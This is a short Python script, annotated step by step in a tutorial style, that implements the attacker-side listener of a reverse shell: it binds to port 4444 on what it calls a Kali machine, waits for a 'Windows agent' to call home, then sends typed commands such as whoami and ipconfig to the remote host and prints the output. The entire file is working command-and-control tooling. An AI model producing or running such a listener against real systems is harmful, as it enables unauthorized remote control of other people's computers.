import socket

def start_listener():
    # 1. Create a "Socket" (the connection point)
    # AF_INET = IPv4, SOCK_STREAM = TCP (reliable connection)
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 2. Bind to all network cards on port 4444
    # "0.0.0.0" means "listen on every IP this Kali machine has"
    server.bind(("0.0.0.0", 4444))
    
    # 3. Start waiting for a "knock" on the door
    server.listen(1)
    print("[*] Listening for incoming connections on port 4444...")

    # 4. Accept the connection when the Windows agent calls home
    client_socket, client_address = server.accept()
    print(f"[*] Connection established from {client_address}")

    while True:
        # 5. Ask YOU for a command (e.g., whoami, dir, ipconfig)
        cmd = input("Shell> ")
        
        if not cmd:
            continue
            
        if cmd.lower() == "exit":
            client_socket.send(b"exit")
            client_socket.close()
            break
        
        # 6. Send your command to the Windows machine
        client_socket.send(cmd.encode())
        
        # 7. Wait for the result and print it
        result = client_socket.recv(16384).decode()
        print(result)

if __name__ == "__main__":
    start_listener()
